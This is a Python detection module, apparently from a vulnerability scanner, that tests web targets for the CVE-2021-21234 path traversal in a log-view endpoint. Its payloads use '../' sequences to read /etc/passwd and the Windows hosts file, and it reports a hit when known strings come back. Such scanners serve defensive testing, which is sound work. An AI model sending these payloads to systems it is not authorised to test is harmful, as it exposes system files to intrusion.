#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2021_21234.py
   Description :   CVE-2021-21234 路径遍历漏洞检测模块
   Author :       sule01u
   date：          2023/10/19
"""
import requests
from urllib.parse import urljoin
from colorama import Fore
from utils.custom_headers import DEFAULT_HEADER, TIMEOUT
from utils.logging_config import configure_logger

# 初始化日志记录
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

# CVE 编号
CVE_ID = "CVE-2021-21234"

# 检测路径遍历漏洞的有效载荷及其特征条件
PAYLOADS = [
    {
        "path": "manage/log/view?filename=/etc/passwd&base=../../../../../../../",
        "conditions": [r"root", r"nobody", r"daemon"]
    },
    {
        "path": "manage/log/view?filename=C:/Windows/System32/drivers/etc/hosts&base=../../../../../../../",
        "conditions": ["Microsoft Corp", "Microsoft TCP/IP for Windows"]
    },
    {
        "path": "manage/log/view?filename=C:\\Windows\\System32\\drivers\\etc\\hosts&base=../../../../../../../",
        "conditions": ["Microsoft Corp", "Microsoft TCP/IP for Windows"]
    }
]

def is_vulnerable(response_text, conditions):
    """
    检查响应内容是否包含所有漏洞特征
    :param response_text: HTTP 响应内容
    :param conditions: 漏洞特征条件列表
    :return: 如果响应内容包含所有特征条件，则返回 True；否则返回 False
    """
    return all(condition in response_text for condition in conditions)

def check(url, dns_domain="", proxies=None, session=None, timeout=TIMEOUT):
    """
    检测 CVE-2021-21234 路径遍历漏洞
    :param url: 待检测的目标 URL
    :param dns_domain: DNS 日志域名（不使用，仅保持接口一致性）
    :param proxies: 代理配置（可选）
    :param session: 复用的 Session 实例（可选）
    :param timeout: 请求超时时间（秒）
    :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
    """
    # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
    session = session or requests.Session()

    try:
        for payload in PAYLOADS:
            target_url = urljoin(url, payload["path"])

            # 发送 GET 请求，测试路径遍历漏洞，使用传入的timeout参数
            response = session.get(target_url, headers=DEFAULT_HEADER, timeout=timeout, verify=False, proxies=proxies)

            # 输出调试信息
            logger.debug(Fore.CYAN + f"[{response.status_code}]" + Fore.BLUE + f"[{response.headers}]", extra={"target": target_url})

            # 检查响应内容是否包含所有漏洞特征
            if response.status_code == 200 and is_vulnerable(response.text, payload["conditions"]):
                details = f"{CVE_ID} vulnerability detected at {target_url}"
                logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
                return True, {
                    "CVE_ID": CVE_ID,
                    "URL": target_url,
                    "Details": details,
                    "ResponseSnippet": response.text[:200] + "...."  # 仅截取前200字符作为报告片段
                }

        # 如果未检测到漏洞，返回 False
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}

    except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
        # 捕获所有请求异常，并记录到日志
        logger.error(f"[Request Error：{e}]", extra={"target": url})
        return False, {}
    except Exception as e:
        # 捕获所有其他未知异常，并记录到日志
        logger.error(f"[Unknown Error：{e}]", extra={"target": url})
        return False, {}
    finally:
        # 如果 session 是本模块创建的，则关闭（否则保持复用的 session 不被关闭）
        if not session:
            session.close()


if __name__ == '__main__':
    # 测试用例
    # 初始化测试代理配置（如需要）
    proxy = {"http": "http://user:password@localhost:8080", "https": "http://user:password@localhost:8080"}

    # 测试 CVE-2021-21234 漏洞检测
    is_vul, res = check("http://localhost:8080/", proxies=proxy)
    print(is_vul, res)